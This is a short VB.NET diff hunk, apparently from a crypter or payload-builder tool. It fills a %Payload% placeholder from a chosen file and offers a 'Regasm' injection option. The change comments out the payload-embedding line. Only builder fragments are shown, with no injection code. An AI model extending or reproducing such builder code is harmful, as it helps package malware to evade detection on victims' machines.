@@ -220,7 +220,7 @@
                 Source = Replace(Source, "%KEY%", Key)
 
                 txtLog.AppendText("Writing Payload..." + Environment.NewLine)
-                Source = Replace(Source, "%Payload%", Helper.iformat(IO.File.ReadAllBytes(txtPayload.Text)))
+                'Source = Replace(Source, "%Payload%", Helper.iformat(IO.File.ReadAllBytes(txtPayload.Text)))
 
                 If chkRegasm.Checked = True Then
                     txtLog.AppendText("Injection..." + Environment.NewLine)
